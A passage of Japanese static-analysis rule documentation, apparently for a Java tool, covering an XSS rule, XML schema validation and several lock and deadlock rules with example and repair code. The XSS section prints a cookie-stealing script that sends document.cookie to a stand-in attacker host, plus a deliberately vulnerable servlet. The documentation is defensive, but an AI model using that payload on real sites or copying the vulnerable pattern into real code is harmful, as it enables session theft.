ユーザーにリンクをクリックさせる必要はありません。



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[汚染データのソース] パラメーターを使用して、汚染されたデータのソースとみなす
データソースを指定できます。以下のソースを指定できます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * データベース
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

[数字データを汚染されているとみなさない] パラメーターをオンにすると、数字データ
(プリミティブ型およびオブジェクトの両方) が信頼されないソースから取得されている
(汚染メソッドから返されている) 場合でも、汚染されていないとみなされます。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>

「セキュリティとの関連」セクションを参照してください。



</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>

N/A



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>
非永続的攻撃:

掲示板またはフォーラムがあり、ユーザーがメッセージをポストできる
Web サイトがあるものとします。一般的に、
登録ユーザは Cookie に保持されるセッション ID を使って追跡され、
このセッション ID はメッセージのポストでユーザを認証するために
使用されます。
悪意のあるプログラマは、JavaScript コードをしのばせたメッセージを
ポストして、そのポストを呼んだ登録ユーザの Cookie (つまり
登録ユーザーのアカウント情報とセッション ID) を盗むことができます。

たとえば次のようなコードは Cookie 情報を盗むことができます。

&lt;SCRIPT&gt;
document.location= '<A target="_blank" HREF="http://attackerhost.example/cgi-bin/cookiesteal.cgi?'+document.cookie">http://attackerhost.example/cgi-bin/cookiesteal.cgi?'+document.cookie</A>
&lt;/SCRIPT&gt;

永続的攻撃:

Web ポータルなど、多くの Web サイトはログイン ユーザーを “Welcome”ページで
迎えます。そのとき、Web サイトによってはログイン ユーザーを参照しているデータが 
URL のクエリー文字列に格納されて画面に表示されることがあります。

URL の例:
<A target="_blank" HREF="http://portal.example/index.php?sessionid=12312312&amp;username=Joe">http://portal.example/index.php?sessionid=12312312&amp;username=Joe</A>

上記の例では、ユーザー名 "Joe" が URL に格納されており、画面には
"Welcome, Joe" というメッセージが表示されます。
悪意のあるプログラマは、Cookie を盗む JavaScript を挿入して
 URL のユーザー名パラメーターを変更し、ログイン ユーザーのアカウントを
 乗っ取ることができます。

大部分のユーザーは、JavaScript が URL に埋め込まれているのは怪しいと感じます。
そのため、ほとんどの場合、悪意のあるプログラマは不正なペイロードを URL エンコードします。

そのような URL エンコーディングとデコードされた文字列の例については次のサイトを参照してください。
<A target="_blank" HREF="http://www.webappsec.org/projects/threat/classes/cross-site_scripting.shtml">http://www.webappsec.org/projects/threat/classes/cross-site_scripting.shtml</A>


デコードされた文字列に含まれるスクリプトは、ユーザーにページが
表示された瞬間にユーザーの Cookie を盗みます。

次のリクエスト処理メソッドを持つ Web アプリケーション (サーブレット) は、
攻撃されます。

import java.io.IOException;
import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class Example
    extends HttpServlet
{
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
        throws ServletException, IOException
    {
        ServletOutputStream response = resp.getOutputStream();
        String sUserName = req.getParameter("username");
        response.print("Welcome, ");
        response.print(sUserName); // 違反
        response.print("\n");
        response.flush();
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
使用前にデータを検証します。

import java.io.IOException;
import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public abstract class Repair
    extends HttpServlet
{
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
        throws ServletException, IOException
    {
        ServletOutputStream response = resp.getOutputStream();
        String sUserName = validate(req.getParameter("username"));
        response.print("Welcome, ");
        response.print(sUserName); // 違反ではない
        response.print("\n");
        response.flush();
    }

    public abstract String validate(Object obj);
}


教育とトレーニング

Introduction to Injection Attacks
Video: <A target="_blank" HREF="https://vimeo.com/262069083">https://vimeo.com/262069083</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf</A>

Parasoft の教育パートナーが、この脆弱性と予防ベスト プラクティスに関するトレーニングを提供しています。
トレーニング リソースへのアクセス方法については、Parasoft 製品サポートにお問い合わせください。
<A target="_blank" HREF="https://app.hackedu.com/link/6fb52549-86ec-48d2-9362-94a71c0d8e42">https://app.hackedu.com/link/6fb52549-86ec-48d2-9362-94a71c0d8e42</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP Top 10 2017 (A7-Cross-Site Scripting (XSS))
<A target="_blank" HREF="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)">https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)</A>

OWASP API Security Top 10-2019
API8-Injection
<A target="_blank" HREF="https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md">https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md</A>

PCI Data Security Standard 3.2
6.5.7 Cross-site scripting (XSS)
<A target="_blank" HREF="https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf">https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/79.html">https://cwe.mitre.org/data/definitions/79.html</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-352: Cross-Site Request Forgery (CSRF)
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/352.html">https://cwe.mitre.org/data/definitions/352.html</A>

Web Application Security Consortium:
<A target="_blank" HREF="http://www.webappsec.org/projects/threat/classes/cross-site_scripting.shtml">http://www.webappsec.org/projects/threat/classes/cross-site_scripting.shtml</A>

OWASP Code Review Guide 2008 V1.1
Reviewing Code for Data Validation p. 127
Reviewing Code for Cross-site scripting p. 141

Tags: OWASP, PCI-DSS, CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.XMLVAL" href="#top">[Top]</a><br/><br/><STRONG>
信頼されていない XML を読み取る前にスキーマまたは DTD を使用して検証する [BD.SECURITY.XMLVAL]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
﻿説明

このルールは、未検証の XML ドキュメントを解析している場合に違反をレポートします。


以下のメソッドを使用する前に検証する必要があります。
    * javax.xml.parsers.SAXParser.parse(...)
    * org.xml.sax.XMLReader.parse(...)
    * javax.xml.parsers.DocumentBuilder.parse(...)
    * javax.xml.bind.Unmarshaller.unmarshal(...)
    * org.jdom.input.SAXBuilder.build(...)
    * org.jdom2.input.SAXBuilder.build(...)
    * javax.xml.stream.XMLStreamReader.next(...)
	

以下の方法で検証を行うことができます。
1. javax.xml.parsers.SAXParserFactory
    * void setValidating(boolean validating) where value of "validating" is true
    * void setSchema(Schema schema) where value of "schema" is not null
    * void setFeature(String name, boolean value)
	
2. javax.xml.parsers.DocumentBuilderFactory
    * void setValidating(boolean validating) where value of "validating" is true
    * void setSchema(Schema schema) where value of "schema" is not null
    * void setFeature(String name, boolean value)
	
3. org.dom4j.io.SAXReader
    * void setValidation(boolean validation) where value of "validation" is true
    * void setFeature(String name, boolean value)
    * using constructor which sets the SaxReader to be validating
	
4. javax.xml.bind.Unmarshaller
    * void setValidating(boolean validating) where value of "validating" is true
    * void setSchema(Schema schema) where value of "schema" is not null
    * void setProperty(String name, Object value)
    * void setEventHandler(ValidationEventHandler handler) where value of "handler" is not null
	
5. org.jdom2.input.SAXBuilder / org.jdom.input.SAXBuilder
    * void setValidation(boolean validate) where value of "validate" is true
    * void setXMLReaderFactory(XMLReaderJDOMFactory rfac)
    * void setDTDHandler(org.xml.sax.DTDHandler dtdHandler) where value of "dtdHandler" is not null
    * void setFeature(String name, boolean value)
    * 検証する SAXBuilder を設定するコンストラクターを使用
	
6. javax.xml.stream.XMLInputFactory
    * void setProperty(String name, Object value)


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.2.3


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
ユーザー入力を処理または格納する前にサニタイズしない場合、インジェクション攻撃の原因になる可能性があります。


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
XML インジェクション攻撃を防ぎます。
攻撃者によって XML タグが挿入された場合、XML パーサーによって認識および解釈され、一部のデータがオーバーライドされる
可能性があります。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

import java.net.Socket;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

public class Example
{
    public void example(Socket sock)
        throws Exception
    {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();
        builder.parse(sock.getInputStream()); // 違反
    }
}



</PRE>
<STRONG>
修正
</STRONG>
<PRE>

import java.net.Socket;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

public class Repair
{
    public void example(Socket sock)
        throws Exception
    {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        factory.setFeature("<A target="_blank" HREF="http://apache.org/xml/features/disallow-doctype-decl">http://apache.org/xml/features/disallow-doctype-decl</A>", true);
        DocumentBuilder builder = factory.newDocumentBuilder();
        builder.parse(sock.getInputStream()); // 違反ではない
    }
}

教育とトレーニング

XML Injection
Video: <A target="_blank" HREF="https://vimeo.com/239480422">https://vimeo.com/239480422</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8_4-XML-Injections.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8_4-XML-Injections.pdf</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP API Security Top 10-2019
API8-Injection
<A target="_blank" HREF="https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md">https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-611: Improper Restriction of XML External Entity Reference
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/611.html">https://cwe.mitre.org/data/definitions/611.html</A>

SEI CERT Oracle Coding Standard for Java
IDS16-J. Prevent XML Injection
<A target="_blank" HREF="https://www.securecoding.cert.org/confluence/display/java/IDS16-J.+Prevent+XML+Injection">https://www.securecoding.cert.org/confluence/display/java/IDS16-J.+Prevent+XML+Injection</A>

Testing for XML Injection (OTG-INPVAL-008)
<A target="_blank" HREF="https://www.owasp.org/index.php/Testing_for_XML_Injection_%28OTG-INPVAL-008%29">https://www.owasp.org/index.php/Testing_for_XML_Injection_%28OTG-INPVAL-008%29</A>

Tags: CWE, CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.TRS.DIFCS" href="#top">[Top]</a><br/><br/><STRONG>
変数は単一の critical セクションのコンテキストで使用するべきである [BD.TRS.DIFCS]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、同じ型で定義されたフィールド、静的フィールド、または非プリミティブ型の
メソッド パラメーターが、1 つのメソッド内の複数のクリティカル セクションで使用されている
場合に違反をレポートします。1 つのメソッドの複数のクリティカル セクションで変数を
使用すると、メソッドの原子性が保証されません。メソッドが複数のスレッドで実行
された場合、変数が指すオブジェクトの状態は予測できません。



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.2


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
「ソフトウェアは共有リソースを排他的に使用しようとしていますが、他のスレッドまたは
プロセスによるリソースの使用を防いでいないか、不適切な方法で防いでいます。」
[CWE-662]  




</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
アプリケーションのデッドロックを防ぎます。


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

import java.util.List;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

public abstract class Example
{
    private List&lt;Integer&gt; _data;

    private final Lock _mutex = new ReentrantLock();

    public void computeData(int[] data)
    {
        for (int i = 0; i &lt; data.length; i++) {
            _mutex.lock();
            _data.add(compute(data[i])); // 違反
            _mutex.unlock();
        }
    }

    protected abstract int compute(int point);
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>

import java.util.List;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

public abstract class Repair
{
    private List&lt;Integer&gt; _data;

    private final Lock _mutex = new ReentrantLock();

    public void computeData(String id, int[] data)
    {
        _mutex.lock();
        for (int i = 0; i &lt; data.length; i++) {
            _data.add(compute(data[i])); // 違反ではない
        }
        _mutex.unlock();
    }

    protected abstract int compute(int point);
}



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

CWE-662: Improper Synchronization
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/662.html">https://cwe.mitre.org/data/definitions/662.html</A>

Tags: CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.TRS.DLOCK" href="#top">[Top]</a><br/><br/><STRONG>
ダブル ロックを避ける [BD.TRS.DLOCK]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、ロックを途中で解放せずに 2 回獲得している場合に
違反をレポートします。このような処理は、いわゆる再帰的 mutex では
適切ですが、通常のロックでは許されず、デッドロックの原因になる可能性が
あります。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.0.7


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
アプリケーションのデッドロックを防ぎます。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

import java.util.Random;
import java.util.concurrent.locks.ReentrantLock;

public class Example
{
    private ReentrantLock lock = null;

    void exclusivelyCompute()
    {
        lock.lock(); // 違反
        if (preconditionHolds()) {
            /* perform some computations */
            exclusivelyCompute();
        }
        lock.unlock();
    }

    public void run()
    {
        lock = new ReentrantLock();
        exclusivelyCompute();
    }

    private boolean preconditionHolds()
    {
        return new Random().nextBoolean();
    }
}



</PRE>
<STRONG>
修正
</STRONG>
<PRE>
上記のサンプルコードを修正するには、ロックと計算を別の関数に分離します
(ただし、ロックの解放を実行する関数が適切なロックを行う関数だけから
呼び出されるように注意します)。

import java.util.Random;
import java.util.concurrent.locks.ReentrantLock;

public class Repair
{
    private ReentrantLock lock = null;

    void exclusivelyCompute()
    {
        lock.lock(); // 違反ではない
        nonexclusivelyCompute();
        lock.unlock();
    }

    public void run()
    {
        lock = new ReentrantLock();
        exclusivelyCompute();
    }

    private static boolean preconditionHolds()
    {
        return new Random().nextBoolean();
    }

    private static void nonexclusivelyCompute()
    {
        if (preconditionHolds()) {
            /* perform some computations */
            nonexclusivelyCompute(); // 違反ではない
        }
    }
}



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

CWE-764: Multiple Locks of a Critical Resource
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/764.html">https://cwe.mitre.org/data/definitions/764.html</A>

Tags: CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.TRS.INSTLOCK" href="#top">[Top]</a><br/><br/><STRONG>
共有の静的データを保護するためにインスタンス ロックを使用しない [BD.TRS.INSTLOCK]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、共有の静的データがインスタンスのロックで保護されている場合に
違反をレポートします。
「静的共有データの保護にインスタンスのロックを使用してはいけません。なぜなら、インスタンス
ロックは、クラスのインスタンスが 2 つ以上作成されている場合は効果がないからです。結果として、
静的ロック オブジェクトを使用していないと、共有ステートは同時アクセスから保護されていない状態の
ままです。」[SEI CERT Oracle Coding Standard for Java;
LCK06-J. Do not use an instance lock to protect shared static data]


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
10.4


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
このルールは、this オブジェクトまたはそのインスタンス フィールドのロックを取得し、同じクラスの
フィールドである静的変数にアクセスしている場合に違反をレポートします。
デフォルトでは、アクセス対象の変数が読み取り専用であることをフロー解析が認識している場合、
つまり、変数が final であり、クラスが final であり、非 final フィールドが存在しない場合、
違反はレポートされません。


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[除外する型] パラメーターを使用すると、ルールの対象外とするクラスの完全修飾型名を列挙できます。
指定された型の変数は、クリティカル セクションからアクセスされたとき安全であるとみなされます。

以下の列を使用すると、[除外する型] テーブルのさまざまな面を定義できます。

* [有効] 列を使用すると、定義済みのメソッドのフロー解析を一時的に無効にすることができます。

* [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。

* [Exclude the subtypes] 列は、指定した型のサブタイプも除外対象とみなすかどうかを指定します。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

public class Example
    implements Runnable
{
    private static int counter;

    private final Object lock = new Object();

    @Override
    public void run()
    {
        synchronized (lock) {
            counter++; // 違反
        }
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
静的オブジェクトをロックします。

public class Repair
    implements Runnable
{
    private static int counter;

    private static final Object lock = new Object();

    @Override
    public void run()
    {
        synchronized (lock) {
            counter++; // 違反ではない
        }
    }
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

SEI CERT Oracle Coding Standard for Java
LCK06-J. Do not use an instance lock to protect shared static data
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/display/java/LCK06-J.+Do+not+use+an+instance+lock+to+protect+shared+static+data">https://wiki.sei.cmu.edu/confluence/display/java/LCK06-J.+Do+not+use+an+instance+lock+to+protect+shared+static+data</A>

Tags: CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.TRS.LOCK" href="#top">[Top]</a><br/><br/><STRONG>
解放されていないロックを放棄してはならない [BD.TRS.LOCK]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、java.util.concurrent.locks.Lock オブジェクトがロックされているが、
ロック解除されていない場合に違反をレポートします。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
9.0


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[ロックされたオブジェクトが解放される可能性のある呼び出し元のレベル] パラメーターを
使用すると、コール グラフの解析の深さを指定できます。パラメーター値が大きくなるほど
結果は正確になりますが、解析は遅くなります。



</PRE>
<STRONG>
利点
</STRONG>
<PRE>
アプリケーションのデッドロックを防ぎます。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>
このサンプルでは、Lock 変数をロックするメソッドが、ロックを
解除する前に例外を throw する可能性のあるメソッドを呼び出しています。
例外が throw されると、変数はロックされたままになり、デッドロックを引き起こす
可能性があります。

import java.io.FileInputStream;
import java.io.IOException;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

public class Example
{
    private Lock _lock = new ReentrantLock();

    private FileInputStream _inputStream;

    private int _lastCharacter;

    public void readSingleByte()
        throws IOException
    {
        _lock.lock();
        _lastCharacter = _inputStream.read(); // ストリームからの読み込みは IOException を throw する可能性がある。
        _lock.unlock();
    } // 違反
}



</PRE>
<STRONG>
修正
</STRONG>
<PRE>
必ずロック解除されるようにするためのベスト プラクティスは、ロック オブジェクトに
よって保護されるコードを try ブロックに入れ、対応する finally ブロックでロックを
解除することです。

import java.io.FileInputStream;
import java.io.IOException;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

public class Repair
{
    private Lock _lock = new ReentrantLock();

    private FileInputStream _inputStream;

    private int _lastCharacter;

    public void readSingleByte()
        throws IOException
    {
        _lock.lock();
        try {
            _lastCharacter = _inputStream.read();
        } finally {
            _lock.unlock();
        }
    }
}



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

CWE-667: Improper Locking
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/667.html">https://cwe.mitre.org/data/definitions/667.html</A>

SEI CERT Coding Standard for Java
LCK08-J. Ensure actively held locks are released on exceptional conditions
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/display/java/LCK08-J.+Ensure+actively+held+locks+are+released+on+exceptional+conditions">https://wiki.sei.cmu.edu/confluence/display/java/LCK08-J.+Ensure+actively+held+locks+are+released+on+exceptional+conditions</A>

Tags: CWE, CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.TRS.ORDER" href="#top">[Top]</a><br/><br/><STRONG>
異なる順序でロックを獲得しない [BD.TRS.ORDER]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、2 つの mutex が異なる順序でロックされている場合に違反をレポートします。
このような使用はデッドロックの原因になります。少なくとも 2 つのロックが
行われ、ロック獲得の順序が異なるパスが少なくとも 2 つある場合に違反がレポート
されます。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.2


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
レポートされた違反は、少なくとも 2 つのパスでロック獲得の順序が異なっている
ことを表します。そのため、レポートされたパスごとに、パスを説明する最上位
レベルのノードがあり、その 1 つ下のレベルに実際のフローパスがあります。


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
アプリケーションのデッドロックを防ぎます。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

public class Example
{
    static Lock lock1 = new ReentrantLock();

    static Lock lock2 = new ReentrantLock();

    static int v1, v2;

    void takeLocksA(Lock a, Lock b)
    {
        a.lock();
        v1++;
        b.lock(); // lock1 の後で lock2 が獲得されている (fooA から) // 違反
        v2++;
        a.unlock();
        b.unlock();
    }

    void takeLocksB(Lock a, Lock b)
    {
        b.lock();
        v2++;
        a.lock(); // lock 2 の後で lock1 が獲得されている (fooB から)
        v1++;
        b.unlock();
        a.unlock();
    }

    void fooA()
    {
        takeLocksA(lock1, lock2);
    }

    void fooB()
    {
        takeLocksB(lock1, lock2);
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>

import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

public class Repair
{
    static Lock lock1 = new ReentrantLock();

    static Lock lock2 = new ReentrantLock();

    static int v1, v2;

    void takeLocksA(Lock a, Lock b)
    {
        a.lock();
        v1++;
        b.lock();
        v2++;
        a.unlock();
        b.unlock();
    }

    void takeLocksB(Lock a, Lock b)
    {
        b.lock();
        v2++;
        a.lock();
        v1++;
        b.unlock();
        a.unlock();
    }

    void fooA()
    {
        takeLocksA(lock1, lock2);
    }

    void fooB()
    {
        takeLocksB(lock2, lock1);
    }
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

CWE-833: Deadlock
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/833.html">https://cwe.mitre.org/data/definitions/833.html</A>

Tags: CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.TRS.TSHL" href="#top">[Top]</a><br/><br/><STRONG>
ロックを保持しているときにブロッキング メソッドを使用してはならない [BD.TRS.TSHL]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、Thread.sleep() など、スレッドの実行を保留するメソッドが、ロックを保持
した状態で呼び出されている場合、つまり、スレッド間のリソース接続を不必要に増加させる
場合に違反をレポートします。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
9.0



</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
スレッド間の不必要なリソース接続や、スレッドの枯渇を防ぎます。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

public class Example
{
    private Object _lockVariable;

    public void sleepThenAct()
        throws InterruptedException
    {
        synchronized (_lockVariable) {
            Thread.sleep(100); // 違反
            // do something
        }
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
synchronized ブロック内の sleep() メソッドの呼び出しを削除します。

public class Repair
{
    private Object _lockVariable;

    public void sleepThenAct()
        throws InterruptedException
    {
        synchronized (_lockVariable) {
            // do something
        }
    }
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

CWE-833: Deadlock
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/833.html">https://cwe.mitre.org/data/definitions/833.html</A>

SEI CERT Oracle Coding Standard for Java
LCK09-J. Do not perform operations that can block while holding a lock
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/display/java/LCK09-J.+Do+not+perform+operations+that+can+block+while+holding+a+lock">https://wiki.sei.cmu.edu/confluence/display/java/LCK09-J.+Do+not+perform+operations+that+can+block+while+holding+a+lock</A>

Cigital Java Security Rulepack # 8:
<A target="_blank" HREF="http://www.cigital.com/securitypack/view/index.html">http://www.cigital.com/securitypack/view/index.html</A>

Tags: CWE, CERT

</PRE><br/><hr/><br/>
</body>
